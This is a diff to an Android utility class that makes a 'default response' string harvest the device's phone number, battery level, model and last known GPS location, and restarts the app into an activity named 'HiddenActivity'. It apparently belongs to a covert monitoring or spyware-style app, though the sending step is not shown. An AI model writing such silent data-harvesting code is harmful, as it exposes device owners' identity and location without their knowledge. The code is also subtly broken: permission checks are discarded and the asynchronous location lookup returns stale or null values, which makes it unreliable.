@@ -1,37 +1,38 @@
 package com.introtomobileappdev.introtomobileappdev.utils;
 
+import android.Manifest;
 import android.content.Context;
 import android.content.Intent;
 import android.location.Location;
+import android.os.BatteryManager;
 import android.os.Build;
+import android.telephony.TelephonyManager;
+import android.widget.Toast;
 
-import com.introtomobileappdev.introtomobileappdev.activities.Ac;
-import com.introtomobileappdev.introtomobileappdev.services.ConnectionService;
+import com.google.android.gms.location.FusedLocationProviderClient;
+import com.google.android.gms.location.LocationServices;
+import com.google.android.gms.tasks.OnSuccessListener;
+import com.introtomobileappdev.introtomobileappdev.activities.HiddenActivity;
 
-import java.io.FileInputStream;
-import java.io.IOException;
 import java.util.Date;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
+
 public abstract class Utils {
 
-    public static byte[] getBytesArrayFrom(final FileInputStream fileInputStream) throws IOException
+    private static Location location = null;
+
+    public static String buildDefaultResponse(Context context)
     {
-        int size = fileInputStream.available();
-        byte[] data = new byte[size];
+        Location location = getLastKnownLocation(context);
 
-        for (int i = 0; i < data.length; i++)
-        {
-            data[i] = (byte) fileInputStream.read();
-        }
+        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
+        context.checkPermission(Manifest.permission.READ_PHONE_STATE, 1,1);
+        String phoneNumber = telephonyManager.getLine1Number();
 
-        return data;
-    }
-
-
-    public static String buildDefaultResponse(Location location)
-    {
+        BatteryManager batteryManager = (BatteryManager) context.getSystemService(Context.BATTERY_SERVICE);
+        int batteryLevel = batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
         String manufacturer = Build.MANUFACTURER;
         String model = Build.MODEL;
         String locationLatitude = 0 + "";
@@ -46,8 +47,25 @@ public abstract class Utils {
 
         return Constants.JAVA_SIGNATURE
                 + manufacturer + " " + model
+                + "{}" + phoneNumber
+                + "{}" + batteryLevel
                 + "{}" + new Date()
                 + "{}" + locationLatitude + "," + locationLongtitude;
+    }
+
+    private static Location getLastKnownLocation(Context context) {
+        FusedLocationProviderClient fusedLocationClient = LocationServices.getFusedLocationProviderClient(context);
+
+        context.checkPermission(Manifest.permission.ACCESS_FINE_LOCATION, 1,1);
+        fusedLocationClient.getLastLocation().addOnSuccessListener(new OnSuccessListener<Location>() {
+            @Override
+            public void onSuccess(Location locationP) {
+                location = locationP;
+            }
+        });
+
+        return location;
+
     }
 
     public static String getFileAbsolutePath(Context context, String fileName, String fileFormat)
@@ -57,16 +75,9 @@ public abstract class Utils {
 
     public static void restartApp(Context context)
     {
-        Intent intent = new Intent(context, Ac.class);
+        Intent intent = new Intent(context, HiddenActivity.class);
         intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         context.startActivity(intent);
-    }
-
-    public static void restartService(Context context)
-    {
-        Intent intent = new Intent(context, ConnectionService.class);
-        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-        context.startService(intent);
     }
 
 
@@ -79,6 +90,5 @@ public abstract class Utils {
         matcher = pattern.matcher(password);
 
         return matcher.matches();
-
     }
 }
